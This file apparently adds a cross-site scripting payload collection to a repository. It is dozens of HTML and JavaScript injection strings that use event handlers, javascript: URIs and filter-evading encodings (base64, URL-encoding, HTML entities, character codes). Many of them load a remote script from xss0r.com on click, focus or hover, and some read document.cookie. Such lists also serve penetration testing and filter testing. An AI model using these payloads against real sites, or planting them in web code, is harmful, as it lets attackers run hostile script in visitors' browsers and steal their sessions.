+<a href="#" onmousedown="let s=document.createElement('script');s.src='https://xss0r.com/Resources/x.js';document.body.appendChild(s)">ClickME
+<button onclick="let s=document.createElement('script');s.src='https://xss0r.com/Resources/x.js';document.body.appendChild(s)">ClickME</button>
+<input type="button" value="ClickME" onclick="let s=document.createElement('script');s.src='https://xss0r.com/Resources/x.js';document.body.appendChild(s)">
+<a href="#" onclick="eval(atob('bGV0IHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHBzOi8veHNzMHIuY29tL1Jlc291cmNlcy94LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpOw=='))">ClickME</a>
+<a href="#" onmouseover="let s=document.createElement('script');s.src='https://xss0r.com/Resources/x.js';document.body.appendChild(s)">ClickME</a>
+
+<button onclick="eval('alert(1)')">ClickME</button>
+<a aa aaa aaaa aaaaaa href=j&#97v&#97script&#x3A;&#97lert(document.cookie)>ClickMe
+<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>ClickME
+<x/ onpointerRawupdatE=+\u0061\u006cert&DiacriticalGrave;1&DiacriticalGrave;>ClickMe!
+<style>@keyframes x{0%{opacity:1}}</style><div style="animation:x 1s" onanimationstart="alert(1)">ClickME</div>
+<a onmouseover="this.href='javascript:alert(1)'">ClickME</a>
+<button onclick="setTimeout('alert(1)', 100)">ClickME</button>
+<a aa aaa aaaa href="javascript:void((function(){try{alert(1)}catch(e){setTimeout(function(){alert(2)},100);}})())">ClickME</a>
+<svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg"><a aa aaa aaaa href="#" onclick="try{alert(1)}catch(e){alert(2)}finally{this.setAttribute('href','javascript:alert(3)')}">ClickME</a></svg>
+<a aa aaa aaaa aaaaa href="javascript:eval(atob('YWxlcnQoMSk7'))" onmouseover="try{alert(1)}catch(e){setTimeout(function(){window.location.href='javascript:alert(2)'},200)}">ClickME</a>
+<svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(2)" onmouseover="try{alert(3)}catch(e){location='javascript:alert(4)'}">ClickME</a></svg>
+<a aa aaa aaaa href="#" onclick="setTimeout(function(){alert(1)},100); this.href='javascript:alert(2)'">ClickME</a>
+<a aa aaa aaaa aaaaa href="javascript:eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))" onmouseover="document.body.appendChild(document.createElement('script')).innerHTML='alert(2)'">ClickME</a>
+<a aa aaa aaaa href="javascript:alert(1)" onerror="this.href='data:text/html;base64,PHNjcmlwdD5hbGVydCgyKTwvc2NyaXB0Pg=='">ClickME</a>
+<img src="invalid.jpg" onerror="alert(1); this.onerror=null; this.src='javascript:alert(2)'"><a href="#" onclick="alert(3)">ClickME</a>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg><style>body{background-image:url('javascript:alert(2)');}</style><a href="#" onmouseover="alert(3)">ClickME</a>
+<a aa aaa href="javascript:alert(1)" onclick="setTimeout(() => location.href='javascript:alert(2)', 1000); return false;">ClickME</a>
+<a aa aaa href="#" onmouseover="try{alert(1)}catch(e){location='javascript:alert(2)'}" onclick="alert(3); this.href='javascript:alert(4)'">ClickME</a>
+<a aa aaa aaaa href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" onmouseover="alert(2)" onclick="alert(3)">ClickME</a>
+<form action="javascript:alert(1)" method="GET"><input type="submit" value="ClickME" onclick="this.form.action='javascript:alert(2)'; alert(3)"></form>
+%3Csvg%20onload%3D%22alert%281%29%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Ca%20href%3D%22javascript%3Aalert%282%29%22%20onmouseover%3D%22try%7Balert%283%29%7Dcatch%28e%29%7Blocation%3D%27javascript%3Aalert%284%29%27%7D%22%3EClickME%3C%2Fa%3E%3C%2Fsvg%3E
+PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxhIGhyZWY9ImphdmFzY3JpcHQ6YWxlcnQoMikiIG9ubW91c2VvdmVyPSJ0cnl7YWxlcnQoMyl9Y2F0Y2goZSl7bG9jYXRpb249J2phdmFzY3JpcHQ6YWxlcnQoNCknfSI+Q2xpY2tNRTwvYT48L3N2Zz4=
+<!-- <svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(2)" onmouseover="try{alert(3)}catch(e){location='javascript:alert(4)'}">ClickME</a></svg> -->
+let x = '<svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(2)" onmouseover="try{alert(3)}catch(e){location=\'javascript:alert(4)\'}">ClickME</a></svg>'.replace(/[a-z]/gi, c => '\\x' + c.charCodeAt(0).toString(16));
+%3Ca%20aa%20aaa%20aaaa%20href%3D%22%23%22%20onclick%3D%22setTimeout%28function%28%29%7Balert%281%29%7D%2C100%29%3B%20this.href%3D%27javascript%3Aalert%282%29%27%22%3EClickME%3C%2Fa%3E
+PGEgYWEgYWFhIGFhYWEgaHJlZj0iIyIgb25jbGljaz0ic2V0VGltZW91dChmdW5jdGlvbigpeyBhbGVydCgxKSB9LCAxMDApOyB0aGlzLmhyZWYgPSAnamF2YXNjcmlwdDphbGVydCgyKSciPkNsaWNrTUU8L2E+
+let x = String.fromCharCode(60, 97, 32, 97, 97, 97, 32, 97, 97, 97, 97, 32, 104, 114, 101, 102, 61, 34, 35, 34, 32, 111, 110, 99, 108, 105, 99, 107, 61, 34, 115, 101, 116, 84, 105, 109, 101, 111, 117, 116, 40, 102, 117, 110, 99, 116, 105, 111, 110, 40, 41, 123, 97, 108, 101, 114, 116, 40, 49, 41, 125, 44, 49, 48, 48, 41, 59, 32, 116, 104, 105, 115, 46, 104, 114, 101, 102, 61, 39, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 58, 97, 108, 101, 114, 116, 40, 50, 41, 39, 34, 62, 67, 108, 105, 99, 107, 77, 69, 60, 47, 97, 62);
+<a aa aaa aaaa href="javascript:eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))" onmouseover="document.body.appendChild(document.createElement('script')).innerHTML='alert(2)'">ClickME</a>
+%3Ca%20aa%20aaa%20aaaa%20href%3D%22javascript%3Aeval%28decodeURIComponent%28%27%2561%256C%2565%2572%2574%2528%2531%2529%27%29%29%22%20onmouseover%3D%22document.body.appendChild%28document.createElement%28%27script%27%29%29.innerHTML%3D%27alert%282%29%27%22%3EClickME%3C%2Fa%3E
+&#x3C;&#x73;&#x76;&#x67;&#x3E;&#x3C;&#x66;&#x6F;&#x72;&#x65;&#x69;&#x67;&#x6E;&#x4F;&#x62;&#x6A;&#x65;&#x63;&#x74;&#x3E;&#x3C;&#x61;&#x20;&#x68;&#x72;&#x65;&#x66;&#x3D;&#x22;&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x22;&#x3E;&#x43;&#x6C;&#x69;&#x63;&#x6B;&#x4D;&#x45;&#x3C;&#x2F;&#x61;&#x3E;&#x3C;&#x2F;&#x66;&#x6F;&#x72;&#x65;&#x69;&#x67;&#x6E;&#x4F;&#x62;&#x6A;&#x65;&#x63;&#x74;&#x3E;&#x3C;&#x2F;&#x73;&#x76;&#x67;&#x3E;
+String.fromCharCode(60, 115, 118, 103, 62, 60, 102, 111, 114, 101, 105, 103, 110, 79, 98, 106, 101, 99, 116, 62, 60, 97, 32, 104, 114, 101, 102, 61, 34, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 58, 97, 108, 101, 114, 116, 40, 49, 41, 34, 62, 67, 108, 105, 99, 107, 77, 69, 60, 47, 97, 62, 60, 47, 102, 111, 114, 101, 105, 103, 110, 79, 98, 106, 101, 99, 116, 62, 60, 47, 115, 118, 103, 62)
+\u003Csvg\u003E\u003CforeignObject\u003E\u003Ca\u0020href\u003D\u0022javascript\u003Aalert\u00281\u0029\u0022\u003EClickME\u003C\u002Fa\u003E\u003C\u002FforeignObject\u003E\u003C\u002Fsvg\u003E
+eval(atob('PHN2Zz48Zm9yZWlnbk9iamVjdD48YSBocmVmPSJqYXZhc2NyaXB0OmFsZXJ0KDEpIj5DbGlja01FPC9hPjwvZm9yZWlnbk9iamVjdD48L3N2Zz4='));
+<dialog open onclose = prompt(1337)><form method=dialog><button>ClickME</button></form>
+<input type="hidden" accesskey="X" onclick="alert(1)">
+<link rel="canonical" accesskey="X" onclick="alert(1)" />
+<div accesskey="X" onclick="alert(document.domain)">Press Alt+Shift+X to continue</div>
+<a href="#" accesskey="X" onclick="alert('XSS Triggered!')">Press Alt+Shift+X to continue</a>
+<button accesskey="X" onclick="alert(document.cookie)">Press Alt+Shift+X to continue</button>
+<span accesskey="X" onclick="alert('XSS via Span')">Press Alt+Shift+X to continue</span>
+<img src="invalid-image.jpg" accesskey="X" onclick="alert('XSS via Image')" alt="Press Alt+Shift+X to continue">
+<textarea accesskey="X" onclick="alert('XSS via Textarea')">Press Alt+Shift+X to continue</textarea>
+<iframe src="about:blank" accesskey="X" onclick="alert('XSS via Iframe')"></iframe>
+<marquee accesskey="X" onclick="alert('XSS via Marquee')">Press Alt+Shift+X to continue</marquee>
+<form accesskey="X" onclick="alert('XSS via Form')"><input type="submit" value="Press Alt+Shift+X to continue"></form>
+<details accesskey="X" onclick="alert('XSS via Details')"><summary>Press Alt+Shift+X to continue</summary></details>
+<input type="hidden" accesskey="X" onfocus="alert(1)" autofocus>
+<div accesskey="X" onmouseover="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">Press Alt+Shift+X to continue</div>
+<a href="#" accesskey="X" onclick="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">Press Alt+Shift+X to continue</a>
+<svg accesskey="X" onload="alert(1)">Press Alt+Shift+X to continue</svg>
+<iframe accesskey="X" onload="alert(1)" src="about:blank"></iframe>
+<a href="#" accesskey="X" onfocus="let s=document.createElement('script');s.src='https://xss0r.com/Resources/x.js';document.body.appendChild(s)">Press Alt+Shift+X</a>
+<button accesskey="X" onfocus="let s=document.createElement('script');s.src='https://xss0r.com/Resources/x.js';document.body.appendChild(s)">Press Alt+Shift+X</button>
+<span accesskey="X" tabindex="0" onfocus="let s=document.createElement('script');s.src='https://xss0r.com/Resources/x.js';document.body.appendChild(s)">Press Alt+Shift+X</span>
+<input accesskey="X" onfocus="let s=document.createElement('script');s.src='https://xss0r.com/Resources/x.js';document.body.appendChild(s)" autofocus>
+<textarea accesskey="X" onfocus="let s=document.createElement('script');s.src='https://xss0r.com/Resources/x.js';document.body.appendChild(s)">Press Alt+Shift+X</textarea>
+<form accesskey="X" onfocus="let s=document.createElement('script');s.src='https://xss0r.com/Resources/x.js';document.body.appendChild(s)"><input type="submit" value="Alt+Shift+X"></form>
+<iframe accesskey="X" onfocus="let s=document.createElement('script');s.src='https://xss0r.com/Resources/x.js';document.body.appendChild(s)" src="about:blank"></iframe>
+<details accesskey="X" onfocus="let s=document.createElement('script');s.src='https://xss0r.com/Resources/x.js';document.body.appendChild(s)"><summary>Alt+Shift+X</summary></details>
+<div accesskey="X" tabindex="0" onfocus="let s=document.createElement('script');s.src='https://xss0r.com/Resources/x.js';document.body.appendChild(s)">Alt+Shift+X</div>
+<marquee accesskey="X" onstart="alert(1)">Press Alt+Shift+X to continue</marquee>
+<details accesskey="X" ontoggle="alert(1)"><summary>Press Alt+Shift+X to continue</summary></details>
+<video accesskey="X" onerror="alert(1)"><source src="invalid.mp4"></video>
+<style accesskey="X" onload="alert(1)"></style>
+<div accesskey="X" onmouseover="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">Press Alt+Shift+X to continue</div>
+
